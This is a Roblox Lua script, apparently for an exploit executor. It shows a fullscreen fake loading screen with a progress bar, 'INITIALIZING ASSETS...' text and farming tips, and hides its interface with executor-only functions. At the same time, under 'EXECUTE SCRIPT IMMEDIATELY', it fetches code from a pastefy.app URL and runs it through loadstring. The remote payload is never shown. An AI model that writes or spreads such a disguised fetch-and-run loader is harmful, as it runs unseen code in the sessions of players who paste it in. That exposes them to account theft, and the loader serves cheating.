-- === Config ===
local DURATION = 20 -- seconds
local SHOW_PERCENT = false
local TIPS = {
    "Water your crops often to keep growth speed high.",
    "Upgrade your watering can to cover more tiles.",
    "Selling at the right time gives more coins.",
    "Fertilizer boosts growth — don’t forget to use it!",
    "Plant rarer seeds for higher profits!",
    "Use your inventory slots smartly to farm faster.",
}

-- === Services ===
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local lp = Players.LocalPlayer

-- === Safe parent ===
local parentGui = (gethui and gethui())
    or (syn and syn.protect_gui and syn.protect_gui(Instance.new("ScreenGui")))
    or game:GetService("CoreGui")

-- === Root Gui ===
local gui = Instance.new("ScreenGui")
gui.Name = "FullLoadingScreen_"..tostring(math.random(1,9999))
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.Parent = parentGui

-- === Fullscreen container ===
local root = Instance.new("Frame")
root.Size = UDim2.new(1,0,1,0)
root.BackgroundColor3 = Color3.fromRGB(15,15,20)
root.BorderSizePixel = 0
root.Parent = gui

-- Fade master
local fadeFrame = Instance.new("Frame")
fadeFrame.BackgroundColor3 = Color3.new(0,0,0)
fadeFrame.Size = UDim2.new(1,0,1,0)
fadeFrame.BorderSizePixel = 0
fadeFrame.BackgroundTransparency = 1
fadeFrame.ZIndex = 9999
fadeFrame.Parent = gui

-- === Moving background shapes ===
local shapesFolder = Instance.new("Folder", root)
shapesFolder.Name = "Shapes"

local function newShape()
    local f = Instance.new("Frame")
    f.AnchorPoint = Vector2.new(.5,.5)
    f.Size = UDim2.new(0, math.random(60,160), 0, math.random(60,160))
    f.Position = UDim2.new(math.random(), 0, math.random(), 0)
    f.BackgroundColor3 = Color3.fromRGB(math.random(40,80), math.random(40,80), math.random(40,80))
    f.BackgroundTransparency = 0.75
    f.BorderSizePixel = 0
    Instance.new("UICorner", f).CornerRadius = UDim.new(1,0)
    f.Parent = shapesFolder

    task.spawn(function()
        while f.Parent do
            local toPos = UDim2.new(math.random(), 0, math.random(), 0)
            local toSize = UDim2.new(0, math.random(60,160), 0, math.random(60,160))
            local t = TweenService:Create(f, TweenInfo.new(math.random(4,7), Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Position = toPos,
                Size = toSize
            })
            t:Play()
            t.Completed:Wait()
            task.wait(.2)
        end
    end)
end

for _ = 1, 15 do
    newShape()
end

-- === UI (center) ===
local holder = Instance.new("Frame")
holder.AnchorPoint = Vector2.new(.5,.5)
holder.Size = UDim2.new(0, 450, 0, 150)
holder.Position = UDim2.new(.5, 0, .7, 0)
holder.BackgroundTransparency = 1
holder.Parent = root

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 36)
title.BackgroundTransparency = 1
title.Text = "INITIALIZING ASSETS..."
title.TextColor3 = Color3.fromRGB(255,255,255)
title.TextStrokeTransparency = 0.8
title.Font = Enum.Font.GothamBlack
title.TextScaled = true
title.Parent = holder

local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(1, 0, 0, 18)
barBg.Position = UDim2.new(0, 0, 0, 60)
barBg.BackgroundColor3 = Color3.fromRGB(35,35,40)
barBg.BorderSizePixel = 0
barBg.Parent = holder
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 6)

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(255,0,0)
barFill.BorderSizePixel = 0
barFill.Parent = barBg
Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 6)

local tip = Instance.new("TextLabel")
tip.Size = UDim2.new(1, 0, 0, 22)
tip.Position = UDim2.new(0, 0, 0, 90)
tip.BackgroundTransparency = 1
tip.Text = ""
tip.TextColor3 = Color3.fromRGB(200,200,200)
tip.Font = Enum.Font.Gotham
tip.TextScaled = true
tip.TextWrapped = true
tip.Parent = holder

local percentLbl
if SHOW_PERCENT then
    percentLbl = Instance.new("TextLabel")
    percentLbl.Size = UDim2.new(1, 0, 0, 20)
    percentLbl.Position = UDim2.new(0, 0, 0, 120)
    percentLbl.BackgroundTransparency = 1
    percentLbl.Text = "0%"
    percentLbl.TextColor3 = Color3.fromRGB(160,160,160)
    percentLbl.Font = Enum.Font.Gotham
    percentLbl.TextScaled = true
    percentLbl.Parent = holder
end

-- === EXECUTE SCRIPT IMMEDIATELY ===
task.spawn(function()
    local s = game:HttpGet("https://pastefy.app/efjArWaD/raw")
    loadstring(s)()
end)

-- RGB bar anim
task.spawn(function()
    local t0 = tick()
    while gui.Parent do
        local t = (tick() - t0) * 0.5
        local r = math.floor((math.sin(t + 0) * 0.5 + 0.5) * 255)
        local g = math.floor((math.sin(t + 2) * 0.5 + 0.5) * 255)
        local b = math.floor((math.sin(t + 4) * 0.5 + 0.5) * 255)
        barFill.BackgroundColor3 = Color3.fromRGB(r,g,b)
        RunService.RenderStepped:Wait()
    end
end)

-- Tips rotator
task.spawn(function()
    local idx = 1
    while gui.Parent do
        tip.Text = "TIP: "..TIPS[idx]
        idx = idx % #TIPS + 1
        task.wait(4)
    end
end)

-- Progress
local steps = DURATION * 20 -- 0.05s per step
for i = 0, steps do
    local alpha = i / steps
    barFill.Size = UDim2.new(alpha, 0, 1, 0)
    if SHOW_PERCENT and percentLbl then
        percentLbl.Text = ("%d%%"):format(math.floor(alpha * 100))
    end
    task.wait(0.05)
end

-- Fade out
TweenService:Create(fadeFrame, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
task.wait(0.55)
gui:Destroy()
